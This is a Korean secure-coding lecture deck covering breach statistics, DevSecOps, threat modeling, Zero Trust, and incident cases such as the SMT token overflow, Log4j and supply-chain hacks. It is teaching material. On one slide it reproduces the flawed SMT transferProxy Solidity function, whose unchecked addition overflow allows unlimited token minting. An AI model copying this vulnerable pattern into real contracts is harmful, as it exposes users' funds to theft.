# 2-SLIDES — 교안 원문 (신뢰도 A)

> 출처: 이동재 교수님 강의교안 PDF를 마크다운으로 변환한 원문. 1~7주차. 검색 시 이 파일이 가장 신뢰도 높음.
> 위치 표기: `[2-SLIDES] N주차 M차시 p.X`


# [2-SLIDES] 1주차 1차시 — 보안약점과 시큐어코딩 개요
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · SQL Injection/SQL 인젝션/SQL 삽입/에스큐엘 인젝션/에스큐엘/SQLi/CWE-89 · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · MFA/Multi-Factor/다중 인증/다중 매체 인증/OTP/FIDO2/WebAuthn · IDOR/Insecure Direct Object References/직접 객체 참조/수평 권한/수직 권한/권한 상승 · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링 · ZAP/OWASP ZAP/Active Scan/Burp/버프스위트/버프 스위트 · 코드 리뷰/Code Review/SAST/DAST/정적 분석/동적 분석/SonarQube/Fortify

## [2-SLIDES] 1주차 1차시 p.1 · 시큐어코딩
시큐어코딩

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[표지 일러스트: 노트북 화면의 차트·그래프 주위에서 사람들이 돋보기·서류를 들고 협업하는 아이소메트릭 그림]

---

## [2-SLIDES] 1주차 1차시 p.2 · SW개발보안 이해
SW개발보안 이해
01 현대 애플리케이션 보안 과제
02 사고사례를 통한 시큐어코딩 이해

---

## [2-SLIDES] 1주차 1차시 p.3 · 학습 목표
학습 목표
현대 애플리케이션의 보안과제를 이해한다
현대 애플리케이션 보안과제를 해결하기 위한 방안을 이해한다.
사고사례를 통한 시큐어코딩을 이해한다.

---

## [2-SLIDES] 1주차 1차시 p.4 · 학습 내용
학습 내용
1. 현대 애플리케이션 보안 과제
2. 사고사례를 통한 시큐어코딩 이해

---

## [2-SLIDES] 1주차 1차시 p.5 · SW개발보안 이해
SW개발보안 이해
01 현대 애플리케이션 보안 과제
02 사고사례를 통한 시큐어코딩 이해

---

## [2-SLIDES] 1주차 1차시 p.6 · 데이터 유출현황 및 침해발생 원인
데이터 유출현황 및 침해발생 원인
출처: 개인정보보호위원회 제공
최근 3년간 개인정보 유출 사고

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[인포그래픽 1: 최근 3년간 개인정보 유출 신고 현황]

| 연도 | 2022년 | 2023년 | 2024년 |
| --- | --- | --- | --- |
| 신고 건수 | 167건 | 318건 | 307건 |

[인포그래픽 2: 2024년 개인정보 유출 사고 원인]

| 원인 | 해킹 | 업무 과실 | 시스템 오류 | 원인 미상 | 고의 유출 |
| --- | --- | --- | --- | --- | --- |
| 건수 | 171건 | 91건 | 23건 | 17건 | 5건 |

[인포그래픽 3: 해킹 세부 유형 (도넛 차트)]

| 유형 | 건수 |
| --- | --- |
| 원인미상 | 87건 |
| 관리자 페이지 비정상 접속 | 23건 |
| SQL 인젝션 | 17건 |
| 랜섬웨어 등 악성코드 | 13건 |
| 크리덴셜 스터핑 | 9건 |
| 웹 셸(XSS, 세션탈취, 원격제어) | 8건 |
| 파라미터 변조 | 4건 |
| 브루트 포스 | 4건 |
| 기타(XSS, 세션탈취, 원격제어) | 4건 |
| 피싱 | 2건 |

---

## [2-SLIDES] 1주차 1차시 p.7 · 데이터 유출현황 및 침해발생 원인
데이터 유출현황 및 침해발생 원인
2020년 한국 기업데이터 유출현황과 데이터 침해 발생원인

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[기사 캡처 1] **국내 SW, 잘 알려진 보안 취약점도 대응 못해** — "xss·SQL 등 익숙한 유형이 다수…'SW 개발보안 인식 부족 방증'" (컴퓨팅, 김윤희 기자, 2021/02/19)
- 국내 소프트웨어(SW)에서 발견되는 취약점 중 대부분이 이미 흔히 알려진 유형
- KISA가 '보안 취약점 신고포상제 운영을 통해 알아본 놓치기 쉬운 취약점 사례별 대응 방안' 보고서 발표
- KISA는 2012년부터 보안 취약점 신고 포상제 운영, 포상 지급 취약점 건수는 작년까지 총 3,173건

[그림 1] 연도별 보안 취약점 포상건수 (출처: KISA)

| 연도 | 2012 | 2013 | 2014 | 2015 | 2016 | 2017 | 2018 | 2019 | 2020 |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| 포상건수 | 14 | 89 | 177 | 215 | 382 | 411 | 581 | 762 | 542 |

[기사 캡처 2] **OECD "소스코드는 곧 취약점…쉬쉬해선 안돼"** — 취약점 대응 체계 활성화 필요성 강조 (컴퓨팅, 김윤희 기자, 2021/03/17)
- "취약점은 디지털 생활의 일부다. 모든 취약점을 제거하는 것은 불가능하다. 그보다는 취약점 조치를 개선해 보안 위협을 줄이고 디지털 전환 시대의 신뢰를 도모해야 한다."
- 보안 취약점을 사업 리스크나 잘못으로 받아들이기보다 일상적인 현상으로 이해하고, 제보 체계와 지속적인 보안 업데이트를 정착시켜야 한다는 OECD 보고서
- KISA가 OECD의 '취약점 조치의 장려(Encouraging vulnerability treatment)' 보고서 번역본 공유
- ■ 취약점 알려줘도 고소·고발로 받아치는 경우 허다

---

## [2-SLIDES] 1주차 1차시 p.8 · 현대 애플리케이션의 보안 과제 (출처: 라드웨어 애플리케이션 보호 위한 
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
현대 애플리케이션의 보안 과제 (출처: 라드웨어 애플리케이션 보호 위한 4가지 도전과제 기술백서)

| 봇관리 | API 보안 | 서비스 거부(DoS) | 지속적인 보안 |
| --- | --- | --- | --- |
| **인터넷 트래픽의 52%는 봇에 의한 통신** | **API로 연결된 다양한 환경** | **여전히 서비스 장애를 일으키는 효과적인 공격** | **DevOps 개발환경에서 민첩성을 위해 희생되는 보안** |
| • 그중 절반은 악성 봇 / • 기업의 79%는 악성봇과 정상봇을 구분하지 못함 / • 악성봇은 네트워크 트래픽 낭비, 도스/디도스 공격, 중요정보/개인정보 수집, 캡챠우회 지능적인 봇 공격수행, 크리덴셜 스터핑을 통한 개인정보 수집에 이용됨 | • IoT, 클라우드, 웹, 모바일 등 다양한 환경에서 애플리케이션이 사용되며, API로 연결 / • API를 통해 서로의 리소스와 정보 공유 / • API 취약점을 이용해 각종 인젝션, 파라미터 조작, 공격사이트로 리다이렉트, 봇 공격 등을 발생시킴 | • 애플리케이션 계층 DoS 공격은 매우 오래된 공격 방식이지만 서비스를 장애를 일으키는데 여전히 효과적 / • HTTP/S 플러드, 슬로우로리스, LOIC, 버퍼오버플로, 브루트 포스 공격 / • IoT봇넷에 의해 구동되는 애플리케이션 계층 공격은 선호되는 디도스 공격 벡터 | • 신속한 개발과 롤아웃 방법론은 애플리케이션을 지속적으로 수정하고 업데이트 하지만 보안을 고려하지 못하는 경우가 발생 / • 개발완료된 서비스의 취약점을 개선하고 보안을 주입하는 것은 더 어려운 일 / • AI기술을 활용한 리소스 매핑, 가능한 위협 분석, 실시간 보안 정책을 생성하고 최적화 |

---

## [2-SLIDES] 1주차 1차시 p.9 · 애플리케이션 보안 과제는 어떻게 해결해야 할까?
애플리케이션 보안 과제는 어떻게 해결해야 할까?
SW개발보안 프로세스
DevSecOps
보안내재화
Security By Design
Zero Trust

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[슬라이드 전체가 큰 컬러 글씨로 된 5개 키워드: SW개발보안 프로세스 / DevSecOps / 보안내재화 / Security By Design / Zero Trust]

---

## [2-SLIDES] 1주차 1차시 p.10 · 애플리케이션 보안(1)
애플리케이션 보안(1)
SW개발보안 프로세스
DevSecOps
〮
애플리케이션 수명주기 따른 반복 지속적 보안 제어 필수

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[슬라이드 전체가 큰 컬러 글씨: SW개발보안 프로세스 / DevSecOps, 아래에 '애플리케이션 수명주기 따른 반복·지속적 보안 제어 필수']

---

## [2-SLIDES] 1주차 1차시 p.11 · SW개발보안 프로세스
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
SW개발보안 프로세스

SW개발과정에서 개발자의 실수, 논리적 오류 등으로 인해 발생될 수 있는 보안약점들을 최소화하여 안전한 SW를 개발하기 위해 소프트웨어 개발 각 단계별 적절한 보안활동 수행

| 요구사항분석 | 설계 | 구현 | 테스트 |
| --- | --- | --- | --- |
| • 요구사항 중 보안요구사항 식별 | • 보안요구사항과 위협에 대한 보안통제를 고려한 위협원 도출 / • 외부 인터페이스 식별 / • 보안통제 수립 | • 표준코딩 정의서 및 SW개발보안 가이드를 준수하여 개발 / • 소스코드 보안약점 진단(도구 활용) | • 실행코드 보안취약점 진단 (동적분석: 스캐닝, 모의해킹 테스트 등) |

- ※ 현재는 SW 개발과정 중 **소스코드 구현단계를 중심으로** SW 개발보안 적용
- ※ **보안취약점(Vulnerability)**: 해킹 등 실제 보안사고에 이용되는 SW 보안약점
- ※ **보안약점(Weakness)**: 보안취약점의 근본 원인이 되는 SW 상의 허점, 결점, 오류 등

---

## [2-SLIDES] 1주차 1차시 p.12 · DevOps환경에서의 DevSecOps (그림출처: 가트너)
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
DevOps환경에서의 DevSecOps (그림출처: 가트너)

[도식: 무한대(∞) 모양 루프. 왼쪽 고리 = **Dev**(가운데 톱니바퀴 'Monitoring and Analytics', 'Security Champs'), 오른쪽 고리 = **Ops**(톱니바퀴 'Monitoring and Analytics', 'Log and Perimeter Monitoring / RASP Feedback', 'API Gateway Security and Performance Logs'). 두 고리가 교차하는 가운데에 **Adapt**와 **Release**]

루프를 따라가는 10단계:

| 순서 | 단계 | 보안 활동 |
| --- | --- | --- |
| 1 | **Plan** | 보안을 담당하는 부서, DevSec Metrics 관리 방안, 보안위협 모델링 수립, 보안관련 플랫폼 교육 등의 보안 관련 문제를 해결해 나가기 위한 계획 수립 |
| 2 | **Create** | 통합개발환경에 보안관련 요소 적용 |
| 3 | **Verify** | SAST(정적 애플리케이션 보안 테스트) / DAST(동적 애플리케이션 보안 테스트) / IAST(상호작용 애플리케이션 보안 테스트) / SCA(소프트웨어 구성분석) |
| 4 | **Preprod** | 카오스 몽키 테스트, 퍼징 테스트, 통합테스트 또는 서비스를 가속화하고 실행중인 컨테이너에 자동화된 침투테스트가 어떻게 동작되는지 확인 |
| 5 | **Release** | 적용되는 소프트웨어 또는 애플리케이션에 대한 서명 진행 |
| 6 | **Prevent** | 서명에 대한 확인, checksum 등 무결성 검사, 심층 방어 조치 수립 |
| 7 | **Detect** | RASP(런타임 애플리케이션 자가 보안), UEBA(사용자 행동 분석, 내부위협, 표적공격 및 금융사기 탐지) |
| 8 | **Respond** | 보안 요건 재검토 및 조정, RASP/WAF(웹 방화벽) 등 런타임 환경에서의 보안 위협 차단 |
| 9 | **Predict** | IoC(네트워크 또는 운영체제에서 관찰된 침입흔적), TI(위협정보), STIX(사이버 위협정보 표현 규격), TAXII(사이버위협정보 전송규격) 등 예상 가능한 위협정보 등을 예측 |
| 10 | **Adapt** | 보안을 담당하는 부서, 보안 위협에 대해 대응 |

---

## [2-SLIDES] 1주차 1차시 p.13 · DevSecOps AWS 아키텍쳐
DevSecOps AWS 아키텍쳐

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[아키텍처 다이어그램: AWS Cloud – DevSecOps Pipeline]

맨 위 **AWS CloudFormation (IaC) (Master Template)**이 파이프라인 전체를 생성. **AWS CodePipeline (CI/CD)** 안에서 4단계로 진행:

1. **Developers → Code Commit (Private Git Repository)**: 개발자가 코드를 커밋
2. **Code Build (Security Validation, Parallel Checks)**: 4가지 보안 검사를 병렬 실행
   - Secrets Scan (Git-Secrets)
   - SAST Check (Insider)
   - SCA Check (OWASP Dependency Check)
   - CloudFormation Scan (stelligent/cfn_nag)
   - 결과는 AWS Security Hub·AWS Lambda로 전달되고, EventBridge → AWS SNS 알림, Amazon S3(Artefacts Storage)에 산출물 저장
   - **"If All 4 Cases Passed, then Move to Stage 3"**
3. **Code Deploy (Pre-Prod)**: CreatePreProdChangeSet → ExecutePreProdChangeSet → **DAST Check (OWASP ZAP)** → **Prod-Approval (Manual)**. AWS CloudFormation(Change set, Stack, Template)으로 Pre-Prod App(ALB, Auto Scaling, VPC, IGW) 구성
4. **Post Approval Move to Stage 4 → Code Deploy (Prod)**: CreateUAT ChangeSet → ExecuteUAT ChangeSet, AWS CloudFormation(Stack, Template)

---

## [2-SLIDES] 1주차 1차시 p.14 · DevSecOps AWS 아키텍쳐
DevSecOps AWS 아키텍쳐

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[AWS 콘솔 캡처: CodePipeline 'devsecops-workshop-pipeline-pipeline']

왼쪽 메뉴: 개발자 도구 > CodePipeline — 소스(CodeCommit: 시작하기, 리포지토리, 승인 규칙 템플릿), 빌드(CodeBuild), 배포(CodeDeploy), 파이프라인(CodePipeline), 설정

| 스테이지 | 액션 | 결과 |
| --- | --- | --- |
| **Source** (성공) | SourceAction (AWS CodeCommit) | ✅ 성공 - 4시간 전 (b4511738) |
| **SCA-and-SAST-Analysis** (실패) | SCAnalysis (AWS CodeBuild) | ✅ 성공 - 4시간 전 |
| | SASTAnalysis (AWS CodeBuild) | ❌ 실패 - 4시간 전, 작업 실행 실패 |

→ SAST 검사에서 보안약점이 발견되어 파이프라인이 **다음 단계로 넘어가지 못하고 멈춘** 상태 (재시도 버튼)

---

## [2-SLIDES] 1주차 1차시 p.15 · DevSecOps AWS 아키텍쳐
DevSecOps AWS 아키텍쳐

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[AWS 콘솔 캡처: 같은 파이프라인의 다음 스테이지]

| 스테이지 | 액션 | 결과 |
| --- | --- | --- |
| **Staging-Depoy-and-DAST-Analysis** (성공) | DeployStagingAction (AWS Elastic Beanstalk) | ✅ 성공 - 7일 전 |
| | ↓ DASTAnalysis (AWS CodeBuild) | ✅ 성공 - 7일 전 |

(스테이징 환경에 배포한 뒤 동적 분석(DAST)을 수행)

---

## [2-SLIDES] 1주차 1차시 p.16 · DevSecOps AWS 아키텍쳐
DevSecOps AWS 아키텍쳐

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[AWS 콘솔 캡처: 마지막 스테이지]

| 스테이지 | 액션 | 결과 |
| --- | --- | --- |
| **Manual-Approval** (성공) | ApprovalRequired (수동 승인) | ✅ 승인됨 - 7일 전 |
| **Production-Depoy** (성공) | DeployProdAction (AWS Elastic Beanstalk) | ✅ 성공 - 7일 전 |

(사람이 수동으로 승인해야 운영 환경에 배포됨)

---

## [2-SLIDES] 1주차 1차시 p.17 · 애플리케이션 보안(2)
애플리케이션 보안(2)
보안내재화
Security By Design
안전(Secure)하게 동작되는 제품을 만들기위해 제품의 설계단계에서부터 보안을 고려함으로써
알려진 취약점을 조기에 효과적으로 제거하는 것을 의미한다.

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[슬라이드 전체가 큰 글씨: 보안내재화 / Security By Design]

---

## [2-SLIDES] 1주차 1차시 p.18 · Security By Design – Threat Modeling
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
Security By Design – Threat Modeling

**위협모델링 프로세스 6단계** (출처: TechTarget)

| 단계 | 내용 |
| --- | --- |
| 1 | 각각의 직무 전문가들로 팀 구성 |
| 2 | 다루어질 위협 환경의 범위 설정 |
| 3 | 특정 애플리케이션 또는 시스템에 대한 모든 가능 위협 식별 |
| 4 | 각 위협을 위험 수준에 따라 순위를 매김 |
| 5 | 완화 조치를 결정하고 실행 |
| 6 | 모든 조사 결과와 조치를 문서화 |

---

## [2-SLIDES] 1주차 1차시 p.19 · Security By Design – Threat Modeling
Security By Design – Threat Modeling

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[위협 모델링 도구 화면 캡처 (Microsoft Threat Modeling Tool 형태)]

데이터 흐름도(DFD): 외부 엔티티(Healthcare Professional, Service Technician, RDMS, Service Program)와 프로세스(Display, Control, Watch Dog)가 데이터 흐름 화살표(User Input, Treatment Data, Technician Input, Log & Treatment Data, CAN, Challenge, Heart Beat, RPC-Request/Response, Export, Import, Treatment Program Update, Log Data)로 연결. 빨간 점선은 **Machine Trust Boundary**(신뢰 경계). 오른쪽 패널은 요소 목록(Browser, Authorization Provider, External Web Application 등)과 속성(Source/Destination Authenticated, Provides Confidentiality/Integrity 등).

**STRIDE 위협 분류**

| 약자 | 위협 |
| --- | --- |
| **S** | Spoofing Identity (신원 위장) |
| **T** | Tampering (변조) |
| **R** | Repudiation (부인) |
| **I** | Information Disclosure (정보 노출) |
| **D** | Denial of Service (서비스 거부) |
| **E** | Elevation of Privileges (권한 상승) |

---

## [2-SLIDES] 1주차 1차시 p.20 · 애플리케이션 보안(3)
애플리케이션 보안(3)
제로 트러스트 원칙을 사용하여 개발
Zero Trust
제로트러스트는 ‘아무것도 신뢰할 수 없다는 가정하에, 사용자 및 다양한 정보를 바탕으로 최소한
의 권한과 세밀한 통제를 지속적으로 수행하는 보안 활동’
‘Never Trust, Always Verify’

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[도식: 제로 트러스트 4단계 순환 (점선 화살표로 처음으로 되돌아감)]

① **Never Trust, Always Verify** (사용자·기기 아이콘) → ② **Least Privilege and Default Deny** (열쇠) → ③ **Full Visibility and Inspection** (돋보기) → ④ **Centralized Management** (톱니바퀴) → 다시 ①

---

## [2-SLIDES] 1주차 1차시 p.21 · 제로 트러스트 보안 모델
제로 트러스트 보안 모델
[BeyondCorp 컴포넌트 1: 기기인증]
접근을 요청하는 호스트가 정상적으로 구글에서 제공한 신뢰할 수 있는 기기임을 확인하
는 것으로 인증된 기기에서만 접속 가능
*디바이스 인벤토리 DB: 회사 네트워크에 접속하는 모든 디바이스 식별
*디바이스 아이덴티티: 관리하는 모든 디바이스는 유일하게 식별,
디바이스 인증서 사용
[BeyondCorp 컴포넌트 2: 사용자 인증]
접근하는 소스트 사용자가 정상적인 구글 임직원인지 확인 및 사용자의 소속 그룹과 업무
확인
* 사용자 인증(User,GroupDB): 모든 User 및 Group DB와 연동되어 있어 사용자명,
소속그룹, 업무범위, 사용자 근무 위치 정보 반영
* Single Sign-On System: 외부에서도 접속 가능한 SSO porta을 통해 이루어지며
인증상식을 Two-facto로 사용자 계정과 OTP 또는 USB 형태의 물리적 키 사용
[BeyondCorp 컴포넌트 3: 접근제어 엔진(Access Control Engine)]
기기정보, 사용자 정보, 취약점 정보 등을 상관 분석해 사용자 접근 허용 여부를 결정하는
엔진. 접근제어 엔진이 접속 허용 또는 차단 의사결정을 내릴 때 관측데이터와 입력데이
터를 사용하여 보안등급평가(Trust Evaluation)과정을 거쳐 반영됨.
* 관측데이터(Observed Data): 계획적으로 생성된 데이터(취약점 스캔결과, AD 정책,
OS버전 및 패치 여부, 설치된 SW 목록 등)
* 입력데이터(PrescrivedData): IT 운영자가 수종으로 관리하는 데이터(기기의 소유
자, 기기에 접속할 수 있는 사용자〮그룹, DNS, DHCP 정보, 특정 VLAN 등)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[도식: BEYONDCORP — A NEW APPROACH TO ENTERPRISE SECURITY (구글)]

- 왼쪽: **Google Building**(Unprivileged Network, Managed Device)과 **Public Network**(Managed Device)
- 두 네트워크 모두 **Access Proxy**와 **Single Sign-On**을 거쳐야 접근 가능 (Unprivileged Network는 802.1X로 RADIUS 인증)
- **접근제어엔진** 영역: Access Proxy ↔ Access Control Engine ↔ Pipeline
- **기기인증** 영역: Device Inventory Database → Trust Inference → Certificate Issuer → Pipeline
- **사용자인증** 영역: Single Sign-On ↔ User/Group Database

(오른쪽 설명 3가지 컴포넌트는 본문 텍스트와 동일)

---

## [2-SLIDES] 1주차 1차시 p.22 · SW개발보안 이해
SW개발보안 이해
01 현대 애플리케이션 보안 과제
02 사고사례를 통한 시큐어코딩 이해

---

## [2-SLIDES] 1주차 1차시 p.23 · 시큐어한 소프트웨어란?
시큐어한 소프트웨어란?
Secure Software
결함 (Defects)
실수 (Mistake) 장애 (Failure)
결점 (Fault)
오류 (Error) 문제(Problem)
버그 (Bugs)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[도식: Secure Software를 방해하는 세 가지 (점선으로 연결, 각각 빨간 ✖ 표시)]

| 단계 | 용어 |
| --- | --- |
| 원인 | 실수(Mistake), 오류(Error) |
| 코드에 남은 것 | 결함(Defects), 결점(Fault), 버그(Bugs) |
| 결과 | 장애(Failure), 문제(Problem) |

---

## [2-SLIDES] 1주차 1차시 p.24 · 개발자의 사소한 실수 -
개발자의 사소한 실수 -
시큐어코딩이 적용되지 않은 스마트 컨트랙트

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[기사 캡처] BLOCKCHAIN NEWS — **코인 무한복사 가능? SMT 사태로 시장 폭락…후오비선 출금 중단** (김동호 기자, 2018-04-25)
- SMT토큰 1경 개 이상 복사, 후오비서 이상거래 포착
- 이더리움 기반 토큰 전부 복사 가능은 사실무근…SMT 스마트컨트랙 문제

[거래소 공지 캡처] Huobi.pro 공지 사항 — "Hangco Pro의 모든 통화 인치 통화 서비스 중지에 대한 발표" (2018-04-25): SmartMesh(SMT) 프로젝트에서 비정상적인 거래를 발견해 모든 통화의 입출금을 일시 중지

---

## [2-SLIDES] 1주차 1차시 p.25 · 개발자의 사소한 실수 -
개발자의 사소한 실수 -
시큐어코딩이 적용되지 않은 스마트 컨트랙트
오버플로우
오버플로우란 숫자가 최대치 이상으로 증가하는 것을 말한다.
0 1 1 1 1 1 1 1
+ 0 0 0 0 0 0 0 1
0 0 0 0 0 0 0 0

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[그림: 8비트 덧셈으로 보는 오버플로우]

```
    0 1 1 1  1 1 1 1     (= 127, 8비트 부호 있는 정수의 최댓값)
  + 0 0 0 0  0 0 0 1     (= 1)
  ─────────────────
    0 0 0 0  0 0 0 0     (결과가 표현 범위를 넘어 0이 됨)
```
(맨 앞 칸(부호 비트)이 주황색으로 강조됨)

---

## [2-SLIDES] 1주차 1차시 p.26 · 개발자의 사소한 실수 -
개발자의 사소한 실수 -
시큐어코딩이 적용되지 않은 스마트 컨트랙트
문제함수: transferProxy
function tranferProxy(address _from, address _to, uint256 _value, uint256 _feeSmt,
uint8 _v, bytes32 _r, bytes32 _s) public transferAllowed(_from) return (bool) {
if(balances[_from] < _feeSmt + _value) revert();
uint256 nonce = nonces[_from];
bytes32 h = keccak256(_from, _to, _value, _feeSmt, nonce);
if ( _from != ecrecover(h,_v,_r,_s)) revert();
if(balance[_to] + value < balances[_to]
|| balances[msg.sender] + _feeSmt < balances[msg.sender]) revert();
balances[_to] += _value;
Transfer(_from, _to, _value);
balances[msg_sender] += _feeSmt;
}

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드에서 주황 상자로 강조된 두 부분]
1. 함수 인자 `(address _from, address _to, uint256 _value, uint256 _feeSmt,` — 공격자가 `_value`와 `_feeSmt`에 매우 큰 값을 넣을 수 있음
2. `if(balances[_from] < _feeSmt + _value) revert();` — **`_feeSmt + _value`가 오버플로우**되면 합이 아주 작은 값이 되어 잔고 검사를 통과해 버림 → 토큰이 무한 생성됨 (SMT 사태의 원인)

---

## [2-SLIDES] 1주차 1차시 p.27 · 개발자의 사소한 실수 -
개발자의 사소한 실수 -
시큐어코딩이 적용되지 않은 스마트 컨트랙트
세이프매스(SafeMath)
이더리움 스마트컨트랙트 개발에 많이 사용되는 솔리디티(Solidity)에서는 오버플로우(overflow)와
언더플로우(underflow) 처리를 위해 SafeMath 라이브러리를 제공하고 있음.
라이브러리는 솔리디티에서 특수한 컨트랙트(Contract)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[코드 캡처: SafeMath 라이브러리]

```solidity
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;        // ← 노란 상자로 강조
    assert(c / a == b);       // ← 곱셈 결과를 다시 나눠 검증
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);           // 언더플로우 방지
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);           // 오버플로우 방지
    return c;
  }
}
```

---

## [2-SLIDES] 1주차 1차시 p.28 · 소프트웨어 보안취약점 사례 – OSS( ) 취약점 공격
소프트웨어 보안취약점 사례 – OSS( ) 취약점 공격
Open Source Software

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[기사 캡처 1] **"방치된 오픈소스 사용"** — log4j 교훈 잊었나? 2년 이상 방치된 오픈소스 88%가 사용 중 (출처: 보안뉴스)
- 88%의 조직에서 여전히 최신 오픈소스 업데이트에 미진한 것으로 나타나
- 오픈소스 라이선스 충돌 및 취약점 감소하는 추세
- 시놉시스, '2022 오픈소스 보안과 리스크 분석(OSSRA)' 보고서 발간 — 전 세계 17개 산업분야 2,400여 개 커머셜 코드 베이스 분석
- 2,097개 코드베이스 중 85%가 4년 이상 지난 오픈소스를 포함, 88%는 최신 버전이 아닌 구성 요소 사용, 이중 5%에 취약한 버전의 Log4j 포함
- "관리를 하지 않아 잊혀지고 나면 사용 위치를 파악하여 업데이트하는데 어려움을 겪게 된다. … 소프트웨어 공급망과 소프트웨어 BOM(원재료 명세서, Bill of Materials)이 중요한 이유가 여기에 있다"

[그래프 캡처 2] **"2023 OSSRA 보고서"** — 상용 소프트웨어의 코드베이스 중 76%는 오픈소스…그 중 48%는 고위험군의 보안 취약점 포함 (출처: 2023 OSSRA 보고서)
- 2018~2022년 추이 그래프 (확대 부분 수치): 오픈소스를 포함하는 코드베이스 비율 **96%**, 취약점이 최소 1개 이상 있는 코드베이스 비율 **84%**, 오픈소스인 코드베이스의 코드 비율 **76%**, 고위험 취약점을 포함하는 코드베이스 비율 **48%**

---

## [2-SLIDES] 1주차 1차시 p.29 · 소프트웨어 보안취약점 사례 – OSS( ) 취약점 공격
소프트웨어 보안취약점 사례 – OSS( ) 취약점 공격
Open Source Software
전세계가 두려워했던 Log4j 취약점
- 2021년 11월 24일 Alibaba Cloud 보안팀에 의해 처음 발견
- Java 기반 로깅 도구인 Apache Log4j 라이브러리 원격 코드 실행 취약점
- 공격자가 로그 메시지를 제어할 수 있는 서버에서 로드된 임의의 코드 실행 가능
- Log4j 라이브러리를 사용하는 대부분의 앱이 취약한 것으로 알려짐
출처: 2023년 SW보안약점 진단원 보수 교육

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[도식: Log4j 취약점 공격 흐름 (출처: 2023년 SW보안약점 진단원 보수 교육)]

```
해커 ── ① 대상탐색 ── ② 공격코드 전송 ──►  웹서버(Apache log4j 2)
                                            ├ Log4j 2: 자바 기반 로그작성 오픈소스 유틸리티
                                            ├ 로그파일 (예: 접속기록(IP, 시간 등), 로그인 정보,
                                            │           사용자 요청내용, 결과 등)
                                            ▼
                                  ③ Log4j 2 라이브러리 실행중 해커의 공격코드 실행
                                     (원격코드실행 취약점, CVE-2021-44228)
                                            ▼
                                  ④ 데이터 탈취, 악성코드 다운로드·실행 등
```

---

## [2-SLIDES] 1주차 1차시 p.30 · 소프트웨어 보안취약점 사례 – 공급망 해킹
소프트웨어 보안취약점 사례 – 공급망 해킹
취약한 소프트웨어를 사용하는 기관, 기업등에 피해를 주기 쉬운 공급망 해킹 공격 유행
공격자들은 소프트웨어 개발-설계-구현-유통 단계별 허점 공략

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[도식 1: 위즈베라 해킹 (출처: Welivesecurity)]

1. Attacker → **Compromise** → Web server with VeraPort support (웹서버 해킹)
2. Target PC(WIZVERA VeraPort) → **Configuration request** → Compromised web server (설정 요청)
3. Compromised web server → **Malicious binary** → Target PC (악성 파일이 정상 보안 프로그램 배포 경로로 설치됨)

[도식 2: Solar Winds 해킹 (출처: Prevasio)]

